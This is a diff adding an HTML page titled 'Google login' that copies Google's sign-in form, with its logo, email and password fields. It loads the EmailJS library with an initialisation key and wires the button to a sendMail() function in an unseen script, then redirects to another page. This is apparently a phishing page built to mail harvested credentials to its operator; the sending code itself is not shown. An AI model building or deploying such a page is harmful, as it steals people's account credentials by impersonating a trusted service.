@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google login </title>
+  <link rel="stylesheet" type="text/css" href="style.css">
+  <link rel="icon" href="google-symbol.icon">
+</head>
+
+<body>
+  <div id="login-container">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo"
+      width="200" height="66">
+    <h2>Sign in</h2>
+    <form action="#">
+      <div class="input-container">
+        <input type="email" id="email" required>
+        <label for="email">Email or phone</label>
+      </div>
+      <div class="input-container">
+        <input type="password" id="password" required>
+        <label for="password">Password</label>
+      </div>
+      <div id="remember-me">
+        <input type="checkbox" id="remember">
+        <label for="remember">Remember me</label>
+      </div>
+      <a href="index3.html">
+        <button onclick="sendMail()" class="button button-primary button-pipaluk">Send a Message</button></a>
+      <div id="forgot-password">
+        <a href="#">Forgot password?</a>
+      </div>
+      <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+      <script type="text/javascript">
+        emailjs.init('daqs6pj4IoTAJvQVh')
+      </script>
+      <a href="index3.html" class="button button-primary button-pipaluk">Send a Message</a>
+
+
+    </form>
+    <div id="create-account">
+      <a href="#">Create account</a>
+    </div>
+  </div>
+  <script src="script .js"></script>
+</body>
+
+</html>
